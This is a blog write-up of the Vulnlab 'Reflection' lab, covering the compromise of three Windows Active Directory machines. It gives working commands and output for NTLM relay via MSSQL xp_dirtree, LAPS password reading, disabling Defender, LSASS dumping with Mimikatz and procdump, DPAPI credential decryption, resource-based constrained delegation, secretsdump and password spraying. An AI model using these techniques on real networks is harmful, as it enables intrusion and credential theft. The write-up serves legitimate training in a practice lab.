---
title: Reflection - Vulnlab
date: 2024-06-22 20:31:39
tags: [vulnlab, Medium, CHAIN]
categories: vulnlab
keywords: 'Vulnlab, Medium, Windows'
description: Reflection was another chain that consisted of three different machines - which is relatively similar to what we saw in Tengu. The great thing about this specifically in my case is the fact that there doesn't seem to be any web-application testing on the internal side. While I am still working to improve my web-application testing skills, a break from it every now and then is more than welcome.
cover: /images/vulnlab/reflection-vl/reflection_slide.png
top_img: /images/cyberpunk-red.jpg
toc: true
toc_number: false
---


Reflection was another chain that consisted of three different machines - which is relatively similar to what we saw in Tengu. The great thing about this specifically in my case is the fact that there doesn't seem to be any web-application testing on the internal side. While I am still working to improve my web-application testing skills, a break from it every now and then is more than welcome.

# Enumeration

Our three machines are `10.10.255.149-151`. We'll query each of these with the NMAP scans that we usually run.

```
└─$ sudo nmap 10.10.255.149 && sudo nmap 10.10.255.150 && sudo nmap 10.10.255.151

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 00:16 EDT
Nmap scan report for 10.10.255.149
Host is up (0.12s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1433/tcp open  ms-sql-s
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 00:16 EDT
Nmap scan report for 10.10.255.150
Host is up (0.11s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 00:19 EDT
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.65% done
Nmap scan report for 10.10.255.151
Host is up (0.11s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 20.11 seconds
```

It seems that this environment is solely Windows Active Directory, with no domain-joined Linux machines available. We have a domain controller running on `.53` given that both Kerberos and the DNS services are running on that machine. We then have two workstations on `.150` and `.151`, from which `.150` seems to be a workstation with an external facing MSSQL service (which is already a vulnerability).

Note that if you wanted to view the domain names for each of the machines, I learned that you don't have to use NMAP scripts to do so. You can simply use `crackmapexec` to query SMB on all of the workstations, as all of them contain this service.

```
└─$ crackmapexec smb 10.10.255.149-167
SMB         10.10.255.150   445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.255.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.255.151   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:reflection.vl) (signing:False) (SMBv1:False)
```

Given that both `MS01` and `WS01` have SMB and RDP running, my first guess is for us to attempt to interact with these services for any null authentication. We'll give those a go starting with SMB with the below commands.

```
└─$ smbclient -L 10.10.255.(150 or 151) -N

└─$ smbclient -L 10.10.255.150 -N

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
staging         Disk      staging environment
```

It seems that on `MS01` (the workstation running MSSQL) allows us to list shares with null authentication. Furthermore, the share `staging` seems to be an uncommon name for a share so we'll query this to see if there's anything we can find.

```
└─$ smbclient \\\\10.10.255.150\\staging -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  7 13:42:48 2023
  ..                                  D        0  Wed Jun  7 13:41:25 2023
  staging_db.conf                     A       50  Thu Jun  8 07:21:49 2023

                6261245 blocks of size 4096. 1166816 blocks available
smb: \> get staging_db.conf
getting file \staging_db.conf of size 50 as staging_db.conf (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
```

# MSSQL Enumeration on MS01

We have access to the `staging_db.conf` being the only file in this share, so we'll pull it to our localhost to see if it has any important information.

```
└─$ cat staging_db.conf 
user=web_staging
password=Washroom510
db=staging
```

The configuration file seems to have credentials for us for the `web_staging` user. I ran a few of these through crackmapexec to see if they're valid credentials to the domain controller, however it does not seem that we can use it to query the DC.

I gave a few of the services that are local to `MS01` a try such as SMB or RDP, however our credentials don't seem to work to those services. Let's look at the MSSQL service specifically, I had the initial thought that these credentials went there however I wanted to test for password reusage in the other areas of the environment before moving on.

```
SQL (web_staging  dbo@staging)> select * from users;
id   username   password        
--   --------   -------------   
 1   b'dev01'   b'Initial123'   

 2   b'dev02'   b'Initial123'
```

It seems like we have credentials from for two users, `dev01` and `dev02`. Unfortunately, I ran a few tests against CME as these users and it seems that there isn't much that we can access from these users.

# NTLM Relay to DC01

This lead me down to a new type of attack that we can exploit that follows a similar title to the name of the box. When I think of the word "Reflection", the first type of attack with a similar connotation that comes to mind is relaying. There are various types of relaying attacks such as SMB, SMTP, or NTLM relay, so we'll need to understand what we're dealing with in order to determine the type of relay attack.

Essentially our goal is to relay another user's credentials that we do NOT know. At a low-level, this is essentially what relaying will do for us; relay a user's authentication from one service on one machine to another service (potentially on another). I want to stress that this exploit is helpful when you're able to trigger authentication attempts and relay them from an account that you do NOT own to another service.

Our current situation may not seem to have those prerequisites, since we aren't aware of any other users and their respective passwords. While we initially think that we only have access to three users currently, we actually have access to one more.

The way I interpreted this may be incorrect and someone can feel free to correct on this if need be, however the fourth account that we can force an authentication attempt against is actually right in MSSQL. You see, when you execute a command in MSSQL or when you execute a query, it's the service account that actually queries that information for you. While we don't know the specific username to the service account (which can vary from box to box), we can force it to authenticate to a machine that we own.

This can be done by utilizing the `xp_dirtree` MSSQL command built into Impacket, which essentially allows us to query a folder on the local host. This can also however, be used to query folders on remote hosts. This means we can point the directory listing command back to our local Kali machine. Our goal is to relay the authentication, however I just want to show the proof-of-concept of what I mean before we continue.

We can boot up `responder` on a separate terminal pane with `sudo responder -I (VPN interface)`.

![](/images/vulnlab/reflection-vl/b.png)

As you can from the above, a successful hash was captured for `svc_web_staging`. While we probably can't crack the hash for this account, this does prove that we have the ability to relay the credentials.

To do this, we can use a tool from Impacket called [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py). This tool will relay the NTLM hash that we can see much like in Responder and use that NTLM hash to authenticate to another service. We can relay the credentials to any service on a target machine, should that service allow for NTLM authentication and allows `svc_web_staging` to authenticate to it. Let's try SMB, though you could also point it to the MSSQL service on the DC if you'd like.

We can start `ntlmrelayx` with the below command, ensuring that we specify the `-i` option for an interactive session.

```
└─$ impacket-ntlmrelayx -t smb://10.10.255.149 -smb2support -i
```

This should launch about over 10 protocols that will listen for incoming requests, much like Responder did. All that's left now is to query our localhost on the MSSQL workstation and forward the request to SMB.

![](/images/vulnlab/reflection-vl/c.png)

As you can see, an SMB client shell was started on our local machine on port 11000. We can connect to this easily using netcat. Be sure that you do NOT close out of `ntlmrelayx` until we've finished using the local shell.

# SMB/MSSQL Enumeration on DC01

```
└─$ nc 127.0.0.1 11000
Type help for list of commands
# help

 open {host,port=445} - opens a SMB connection against the target host/port
```

We seem to have a semi-interactive SMB shell, which has successfully connected to the DC through NTLM relay. We can now enumerate the SMB shares in the context of `svc_web_staging`. You can enumerate shares with the `shares` command.

```
# shares
ADMIN$
C$
IPC$
NETLOGON
prod
SYSVOL
# use prod
# ls
drw-rw-rw-          0  Wed Jun  7 13:44:26 2023 .
drw-rw-rw-          0  Wed Jun  7 13:43:22 2023 ..
-rw-rw-rw-         45  Thu Jun  8 07:24:39 2023 prod_db.conf
```

As you can see from the above, there is a `prod_db.conf` file within the `prod` share, we'll grab this to see if there's anything we can find within it. You can do so with a simple `get` command.

```
└─$ cat prod_db.conf
user=web_prod
password=[...snip...]
db=prod
```

This file contains the password for `web_prod`, who I would assume much like `web_staging` is able to authenticate regularly to the MSSQL service on the DC. While you can't verify this with `crackmapexec` as this requires your request to go to LDAP (which is currently blocking logins from untrusted domains).

However if we attempt to log-in with Impacket, we can see that the request travels through as intended.

```
└─$ impacket-mssqlclient reflection.vl/'web_prod':'[...snip...]'@10.10.255.149                     
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (web_prod  guest@master)>
```

Let's enumerate a little further into a few of the tables, I noticed immediately that there was a different table in this MSSQL service titled `prod`, so we'll look into that. 

Note that if you relayed your `svc_web_staging` NTLM credentials to MSSQL when we were performing NTLM relay earlier, you would NOT have access to this database. This is because only `web_prod` is able to query it, meaning you would have to relay to SMB anyways. You'd be able to verify that the `prod_db.conf` file exists since you can query the local filesystem with `xp_dirtree` and you would notice that you can view the SMB shares from the `C:\` drive.

```
SQL (web_prod  guest@master)> use prod
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: prod
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'prod'.
SQL (web_prod  dbo@prod)> select table_name from information_schema.tables
table_name   
----------   
users
```

As you can see, there is a similar `users` table within this database, so let's query it to see if there are any other credentials we can receive.

```
SQL (web_prod  dbo@prod)> select * from users
id   name              password            
--   ---------------   -----------------   
 1   b'abbie.smith'    b'[...snip...]'   

 2   b'dorothy.rose'   b'[...snip...]'
```

This gives us the credentials to both `abbie.smith` and `dorothy.rose`, both being domain users within the AD instance of this chain. At this point - we should be fine to close out of NTLM relay for now as we won't need it anymore.

# Domain Enumeration with Bloodhound

While we weren't able to query LDAP earlier since we were using accounts that cause the untrusted domain rule to execute, we now have proper domain user credentials meaning we can query LDAP as we normally would. Let's dump the domain with these credentials using the [Bloodhound Python ingestor](https://github.com/dirkjanm/BloodHound.py).

```
└─$ bloodhound-python -d 'reflection.vl' -u 'abbie.smith' -p '[...snip...]' -c all -ns 10.10.255.149 --zip
```

Now that we have all of the domain objects dumped to a compressed archive, we can load these into [Bloodhound](https://github.com/BloodHoundAD/BloodHound).

After uploading them to the Bloodhound database, let's take a look at some of the users that we can potentially exploit to get onto one of the workstations. Note that although you have credentials to `abbie.smith` and `dorothy.rose`, they do NOT have access to WinRM or RDP or either of the `WS01` or `MS01` workstations.

When looking around at the accounts that we currently have control over, I noticed that one of the users, `abbie.smith`, has a notable outbound object control. 

![](/images/vulnlab/reflection-vl/d.png)

It seems that `abbie.smith` has `GenericAll` over the `MS01` workstation. This specific object control is otherwise known as full control, meaning the `MS01` workstation allows `abbie.smith` to manipulate it however it may wish. Normally if we had `GenericAll` over a domain user, we would just be able to change the domain user's password with `bloodyAD`. That being said, we have this privilege over the machine itself instead of a specific user.

There are a few things that we can try, notably resource-based constrained delegation (RBCD) or local administrator password solution (LAPS) exploitation. The only issue with RBCD is that we do not have control of a machine that has an SPN set to do this. We also can't add a computer due to both `abbie.smith` and `dorothy.rose` having a MachineAccountQuota (MAQ) value of 0. We would need a MAQ value of either 1 or above to be able to do this.

# Reading LAPS Password for MS01

Thus, let's try exploiting [LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview). This specific service is a Windows feature within most Active Directory environments and Microsoft Entra environments. It essentially backs up the password of the local administrator account of the machine it is enabled on and acts like a cache that stores the respective administrator password. Due to us having `GenericAll` over the machine account, we can read the LAPS password of the Administrator account on this workstation.

Easily enough `crackmapexec` has a built-in module to do this, which will dump the LAPS password of the `MS01` machine. We'll need to point our request to LDAP on the DC first before specifically reading the LAPS password of the Administrator on `MS01`.

```
└─$ crackmapexec ldap 10.10.255.149 -u 'abbie.smith' -p '[...snip...]' --kdcHost 10.10.255.150 -M laps
SMB         10.10.255.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
LDAP        10.10.255.149   389    DC01             [+] reflection.vl\abbie.smith:[...snip...]
LAPS        10.10.255.149   389    DC01             [*] Getting LAPS Passwords
LAPS        10.10.255.149   389    DC01             Computer: MS01$                Password: [...snip...]
```

As you can see, the password was dumped successfully. Note that this exploit would only work if LAPS was actually running on the target and we had the respective privilege to be able to dump it.

Now that we have the password for that user, we should be able to log in as them. Although testing your credentials `crackmapexec` onto services such as WinRM or RDP on this workstation would come back negative, you can still log in as you normally would through either of those services. Let's use them to log in to WinRM using `evil-winrm`.

```
└─$ evil-winrm --ip 10.10.255.150 -u 'Administrator' -p '[...snip...]' 
    
Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                           
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\Administrator\Desktop\flag.txt
[...snip...]
```

Now that we have control over the `MS01` workstation, we can read the first flag as seen above.

# Pivoting to WS01

Let's now turn our attention to the next part of the chain, as we'll need to escalate to the other workstations on the environment. Given the rule of thumb with these chains, I'm assuming that we'll need to compromise `WS01` first before the DC.

We'll take a look at Bloodhound again to see if there are any domain user objects that we can use pivot to `WS01`. I first searched through the `domain users` group and selected all of the `Direct Members` to view every user account on the domain. 

I immediately saw something different here with another user on the domain, that user being `Georgia.Price`.

![](/images/vulnlab/reflection-vl/e.png)

As you can see from the screenshot above, it seems as though `Georgia.Price` has the same `GenericAll` permissions that `abbie.smith` had, this time being on `WS01`. This means with `Georgia.Price`'s credentials, we should be able to either read the LAPS password or exploit RBCD on `WS01`. The only stipulate here is that we do not current possess those credentials.

# Credential Hunting on MS01

Now that we have the ability to enumerate `MS01`, we can do a bit of credential hunting to see if we can find the password for `Georgia.Price`. I stood up a [Sliver C2](https://github.com/BishopFox/sliver) server so we can easily transfer files without needing to curl our binaries to the respective machines we control.

We'll need to disable AV first before getting our implant onto `MS01`, we have the ability to do that given that we are the Administrator on the machine.

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> Set-MpPreference -DisableRealTimeMonitoring $true
```

![](/images/vulnlab/reflection-vl/f.png)

There are a few things that we can do to try and hunt for this password, I'll show three methods that I tried initially before showing the solution. While these first two solutions are not the answer for retrieving the credentials for `Georgia.Price`, they are helpful to try in other scenarios.

Firstly what comes to mind, since we have access to the local Administrator account on `MS01`, we can dump all of the cached credentials in memory. We'll do so by dropping [Mimikatz](https://github.com/ParrotSec/mimikatz) to the filesystem.

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
[...snip...]
mimikatz(commandline) # exit
```

This should dump all of the cached credentials, though none of them seem to be of use. If `Georgia.Price` did have a cached credential, it would be here. We do see `svc_web_staging`'s plaintext password, however this doesn't seem to be of help to us.

Next thing we could try is retrieving the LSASS from this machine and reading the machine secrets to see if there are any passwords stored here. You might think that we just did that with Mimikatz above, however doing this can also dump the master keys and GUIDs for any cached DPAPI credentials stored on the machine.

First, you'll need to dump the LSASS on the remote machine. While you can do it straight from Sliver, this is incredibly loud and also the potential to crash your session since AV can still track this large handle even though we've disabled it in our current process. There are alternatives to this, notably using [procdump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) which is not picked up by AV as a malicious executable. The great thing about using `procdump` is that I found the executable for it within `C:\Tools`, meaning we don't need to transfer it from our Kali machine.

```
*Evil-WinRM* PS C:\Tools> .\procdump64.exe -accepteula -ma lsass.exe lsass.dmp
*Evil-WinRM* PS C:\Tools> mv lsass.dmp C:\Users\Administrator\Documents
```

Now that we have the LSASS dumped to a file, we'll put it to our Kali machine through Sliver and read it with `pypykatz`.

```
└─$ pypykatz lsa minidump lsass.dmp
[...snip...]
== DPAPI [3e7]==
luid 999
key_guid d0486e64-ff99-4f38-8962-56d7767effbd
masterkey ca00bf269b1c1879ad1d664d6fadd9d4169b408e953d9acfece3476622fccc85c72b0e9879222b12a08ec6ee3f1c55d5b772d3d404c520c886413321af99caf0
sha1_masterkey 21a9c244e05002762c3b3f51845a58677a921e2e
== DPAPI [3e7]==
luid 999
key_guid e233b32e-4d94-4f33-8404-b89d08003375
masterkey 73694a6e64f4ff7947bdad1cc3fe941df4deb26b33060405eab4ce3225db174bd6e0045c1dd2d7b50403f60fc9ce01b908f1925c937f77be3fa85e24db2c6d68
sha1_masterkey 10134d260068b772beec3f5c7e8a6828b68d2023
== DPAPI [3e7]==
luid 999
key_guid ea60aa58-d914-4cb4-a993-ca09a343fc78
masterkey a91c09519bbf0b28ca662f8c0b8f680b5902f9e99438df44d6e2563ca5156259ece153cc041dce1dca518f633d299adb530d37686218a5d84e409a600468b20d
sha1_masterkey b4ac52b7d91b71f7010a9aed39e35ea92e8391b0
```

We'll take note of these DPAPI credential master keys for now.

Lastly, you can also try enumerating scheduled tasks. We can do so by dumping all tasks and their attributes using `schtasks` in our WinRM session. I learned to do during my time doing [Tengu](https://dan-feliciano.com/2024/06/05/tengu/), which is also a great machine to try for practice.

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> schtasks /query /v /fo LIST > tasklist.txt
```

We can pull this to our local Kali machine through Sliver to read it. I found an interesting task denoted as `\Backup` that seems to be owned by `Georgia.Price`.

![](/images/vulnlab/reflection-vl/g.png)

This task seems to be running as that user, which prompts us to attempt to see if we can edit it. Luckily enough we don't have to do that through PowerShell, as we have Administrator access to RDP so we can just do it through the Task Scheduler GUI. The only issue with this method is that we are required to enter `Georgia.Price`'s credentials in order to edit the scheduled task. If we had the ability to do this, we could easily MITM the `ls` request and point it to Responder, to which we could then try to crack the NetNTLMv2 hash that we'd receive.

# Dumping DPAPI Cached Credentials

So pulling this all together, it does not seem that any of the aforementioned methods are usable to receive `Georgia.Price`'s plaintext credentials. However, as I showed from before we do have access to a few master keys that may correspond to cached DPAPI credentials.

We can run [Seatbelt](https://github.com/GhostPack/Seatbelt) from Sliver C2, you could also compile it with Visual Studio and drop the executable to the filesystem. The Sliver armory contains `seatbelt` so we'll just do it from there.

```
sliver (reflection) > seatbelt WindowsCredentialFiles
......
  Folder : C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

    FileName     : 2A5FD8B6E555858DE1974096F0A5DD39
    Description  : Local Credential Data
    MasterKey    : d0486e64-ff99-4f38-8962-56d7767effbd
    Accessed     : 6/7/2023 12:22:44 PM
    Modified     : 6/7/2023 12:22:44 PM
    Size         : 576
```

If you remember earlier, the master key was a relatively long string of text at the bottom of our DMP file. That is the unencrypted master key, which normally we would use the corresponding GUID to decrypt it. Luckily enough, now that we have the decrypted master key, we just need to plug the right one into its respective credential file.

I left one of the credential files in the above output as it corresponds to the GUID that was listed for one of the DPAPI master keys from the DMP file. There is another credential file with the same GUID, however I found after some testing that it is not the correct credential file for us to exploit. This just takes some trial and error if you have the same GUID for multiple master keys.

If we have the correct master key and its corresponding credential file, we should be able to dump the credential blob (otherwise being the plaintext password) for the user it belongs to. I'll put all of the respective attributes that we have to dump the credential blob.

* Key GUID - `d0486e64-ff99-4f38-8962-56d7767effbd`
* Master Key - `ca00bf269b1c1879ad1d664d6fadd9d4169b408e953d9acfece3476622fccc85c72b0e9879222b12a08ec6ee3f1c55d5b772d3d404c520c886413321af99caf0`
* Credential File - `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\2A5FD8B6E555858DE1974096F0A5DD39`

Given that we have all of the assets required, let's use Mimikatz once more to dump the credential blob. I've found that running through WinRM prompts an error, however if you log in as the Administrator through RDP it should work as intended.

```
PS C:\Users\Administrator\Documents> .\mimikatz.exe "dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\2A5FD8B6E555858DE1974096F0A5DD39 /masterkey:ca00bf269b1c1879ad1d664d6fadd9d4169b408e95[...snip...]3f1c55d5b772d3d404c520c886413321af99caf0" "exit"

......
  TargetName     : Domain:batch=TaskScheduler:Task:{013CD3ED-72CB-4801-99D7-8E7CA1F7E370}
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : REFLECTION\Georgia.Price
  CredentialBlob : [...snip...]
  Attributes     : 0
```

As you can see, this credential file seemed to correspond to `Georgia.Price`. Our theory for task scheduler from before was half correct, as the plaintext password for the user is stored on this task. The credential blob that we dumped corresponded to this specific task scheduler credential attribute, as this is where it is stored.

# Exploiting Resource-Based Constrained Delegation

We can now use the `GenericAll` permissions as `Georgia.Price` to exploit the `WS01` workstation.

I tested for LAPS once again to see if we could read the corresponding LAPS password, however I did not come back with any results. This is because unlike `MS01`, `WS01` does not have LAPS configured to run.

Despite this, we do have another exploit that we can test - RBCD. Resource-based constrained delegation essentially allows us to utilize a compromised machine account to request for a service ticket in which we impersonate the user that it belongs to. The reason that this did not work before is that we did not have control over a machine account that could do this. However, now that we do have one being `MS01$`, we can exploit this functionality.

We'll first need to set the delegation properties between `MS01$` and `WS01$` respectively so that `MS01` can perform delegation on behalf of users in `WS01`. Impacket has a utility to do this.

```
└─$ impacket-rbcd -delegate-from 'MS01$' -delegate-to 'WS01$' -action 'write' 'reflection.vl/georgia.price:[...snip...]'
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] MS01$ can now impersonate users on WS01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     MS01$        (S-1-5-21-3375389138-1770791787-1490854311-1104)
```

Now that we have that set, we can now exploit S4U2Proxy to request for a service ticket to CIFS (being SMB) as the Administrator user.

The only stipulate here is that we'll need the plaintext password of the `MS01$` machine account to do this. We did dump all the credentials to the `MS01` machine earlier from Mimikatz, so we can use the machine account's NTLM hash and pass-the-hash to Impacket command we're about to run.

```
└─$ impacket-getST -spn 'cifs/ws01.reflection.vl' -impersonate 'Administrator' 'reflection.vl/MS01$' -hashes :548f3a[...snip...]0eaadb1
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_ws01.reflection.vl@REFLECTION.VL.ccache
```

Now that we have a saved Kerberos service ticket as the Administrator user, we can now dump the secrets of `WS01` remotely with `secretsdump`.

```
└─$ impacket-secretsdump -k ws01.reflection.vl                                  
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
......
REFLECTION\WS01$:aad3b435b51404eeaad3b435b51404ee:755b20085[...snip...]4c9e:::
[*] DefaultPassword 
reflection.vl\Rhys.Garner:[...snip...]
```

This will eventually dump the password for `Rhys.Garner`, who is a local administrator on `WS01`. This means using their credentials we should be able to authenticate to RDP to this workstation. I found that WinRM authentication wasn't working me, so RDP is another alternative.

![](/images/vulnlab/reflection-vl/h.png)

As you can see, the second flag is within the Desktop directory for this user.

# Pivoting to DC01

So our next and final step to compromising this environment is to take control over the DC from here. Note that if we want to get a session as SYSTEM on `WS01`, we can use Sliver's built-in `getsystem` command which will spawn a new session as SYSTEM.

I tried a few different tactics such as viewing the cached Kerberos credentials on this machine, to which I found that there was an `LDAP` cached ticket for `Rhys.Garner` from the DC. I tried a few tactics that came to mind when I saw this, such as requesting for an alternate service name for CIFS on the DC. That did not seem to work, so I decided to pivot elsewhere. There are also no credentials or applications that we could exploit on this machine, so the exploit has to be externally through AD ACLs.

Now when I had figured out what to do, it seemed incredibly simple in hindsight. This is a tactic that is always worth a try to give if you have credentials, which is the idea of password reusage. Spraying passwords that you currently own to other users is never a bad idea unless you're in an environment that restricts brute-forcing. In our case, that does not seem to be an issue.

I pulled all of the users from Bloodhound and placed them into a wordlist, you can do so just simply by creating a text file and reading from all of the domain user nodes.

```
└─$ cat ul.txt    
dom_rgarner
svc_web_prod
svc_web_staging
deborah.collins
jeremy_marshall
rhys.garner
dylan.marsh
dorothy.rose
craig.williams
bethany.wright
abbie.smith
michael.wilkinson
labadm
georgia.price
```

Now that we have this user list, let's see if `georgia.price` shares a password with any of these users. We can do so with `crackmapexec`.

```
└─$ crackmapexec smb 10.10.255.149 -u ul.txt -p '[...snip...]'   
SMB         10.10.255.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.255.149   445    DC01             [+] reflection.vl\dom_rgarner:[...snip...] (Pwn3d!)
```

We can see that a successful authentication attempt came back for `dom_rgarner`. I verified that the user `dom_rgarner` is a domain admin and also has access to WinRM on the DC. You can view this in Bloodhound on the user's node.

So given that we have access to a domain admin, we can now take hold of the DC and authenticate to it to complete this chain. 

```
└─$ evil-winrm --ip 10.10.255.149 -u 'dom_rgarner' -p '[...snip...]'
 
Evil-WinRM shell v3.5
   
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
 
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\dom_rgarner\Documents> cat C:\Users\Administrator\Desktop\flag.txt
[...snip...]
*Evil-WinRM* PS C:\Users\dom_rgarner\Documents> hostname
dc01
```

As seen above, we are able to read the last flag within the Administrator home directory. This means that we have successfully compromised this chain!

![](/images/vulnlab/reflection-vl/i.png)

# Conclusion

This chain was very fun, and it definitely was a hard-hitter for Windows pivoting and privilege escalation. Learning how to do NTLM relay was very different, and I believe that it definitely helped with strengthening some skills. Big thanks to xct and r0BIT for developing this chain, it was great!

# Resources

https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py
https://github.com/dirkjanm/BloodHound.py
https://github.com/BloodHoundAD/BloodHound
https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview
https://github.com/BishopFox/sliver
https://github.com/ParrotSec/mimikatz
https://learn.microsoft.com/en-us/sysinternals/downloads/procdump
https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz
https://dan-feliciano.com/2024/06/05/tengu/
https://github.com/GhostPack/Seatbelt

